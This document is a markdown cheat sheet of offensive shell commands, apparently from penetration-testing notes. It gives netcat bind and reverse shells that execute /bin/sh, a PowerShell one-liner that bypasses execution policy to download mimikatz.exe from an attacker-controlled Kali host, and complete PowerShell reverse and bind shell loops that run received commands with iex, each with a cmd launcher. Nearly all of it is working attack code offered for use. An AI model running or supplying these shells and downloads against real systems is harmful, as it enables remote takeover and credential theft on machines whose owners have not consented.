# Commands for establishing connections and transfering files
https://manpages.debian.org/bullseye/netcat-traditional/nc.1.en.html

## Connecting using netcat
### Listening:
```console
nc -nlvp $PORT
```

### Connecting:
```console
nc -nv $ADDRESS $PORT
```

- `-n` : numeric-only IP addresses, no DNS
- `-l` : listen mode, for inbound connects
- `-v` : verbose [use twice to be more verbose]
- `-p` : local port number (port numbers can be individual or ranges: lo-hi [inclusive])

## File transfer
### Receiving file:
```console
nc -nlvp $PORT > $FILENAME_RCPT
```

### Sending file:
```console
nc -np $PORT < $FILENAME_SEND
```

## Bind shell
### Listening:
```console
FILENAME=/bin/sh
nc -nlvp $PORT -e $FILENAME
```
`-e` : specify filename to exec after connect (use with caution). See the -c option for enhanced functionality.

### Connecting:
```console
nc -nv $ADDRESS $PORT
```

## Reverse bind shell
### Listening:
```console
nc -nlvp $PORT
```
### Connecting:
```console
FILENAME=/bin/sh
nc -nv $ADDRESS $PORT -e $FILENAME
```

## Downloading files from Kali to Windows target
### Setup http web server:
```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
sudo python3 -m http.server 80 &> /dev/null &
```

### Downloading:
```console
set SRC_URL=http://kali.vx/mimikatz.exe
set DST_PATH=%USERPROFILE%\mimikatz.exe
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile($env:SRC_URL,$env:DST_PATH)
```

## Windows reverse bind shell
### Setup listening in kali:
```console
nc -lnvp $PORT
```
### Powershell code:
```console
$ADDRESS='kali.vx'
$PORT=443
$CLIENT = New-Object System.Net.Sockets.TCPClient($ADDRESS,$PORT)
$STREAM = $CLIENT.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
$SENDBACK = (iex $DATA 2>&1 | Out-String )
$SENDBACK2 = $sendback + 'PS ' + (pwd).Path + '> '
$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2)
$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length)
$STREAM.Flush()
}
$CLIENT.Close()
```
### Running powershell from cmd:
```console
set ADDRESS=kali.vx
set PORT=443
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$CLIENT = New-Object System.Net.Sockets.TCPClient($env:ADDRESS,$env:PORT);$STREAM = $CLIENT.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0){$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$SENDBACK = (iex $DATA 2>&1 | Out-String );$SENDBACK2 = $sendback + 'PS ' + (pwd).Path + '> ';$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2);$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length);$STREAM.Flush()};$CLIENT.Close();"
```

## Windows bind shell
### Powershell code:
```console
$PORT=443
$LISTENER = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$PORT)
$LISTENER.start()
$CLIENT = $LISTENER.AcceptTcpClient()
$STREAM = $CLIENT.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
$SENDBACK = (iex $DATA 2>&1 | Out-String )
$SENDBACK2 = $SENDBACK + 'PS ' + (pwd).Path + '> '
$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2)
$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length)
$STREAM.Flush()
}
$CLIENT.Close()
$LISTENER.Stop()
```

### Running powershell from cmd:
```console
set PORT=443
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$LISTENER = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$env:PORT);$LISTENER.start();$CLIENT = $LISTENER.AcceptTcpClient();$STREAM = $CLIENT.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0){$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$SENDBACK = (iex $DATA 2>&1 | Out-String );$SENDBACK2 = $SENDBACK + 'PS ' + (pwd).Path + '> ';$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2);$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length);$STREAM.Flush()};$CLIENT.Close();$LISTENER.Stop();"
```

### Connecting from kali:
```console
nc -nv $ADDRESS $PORT
```
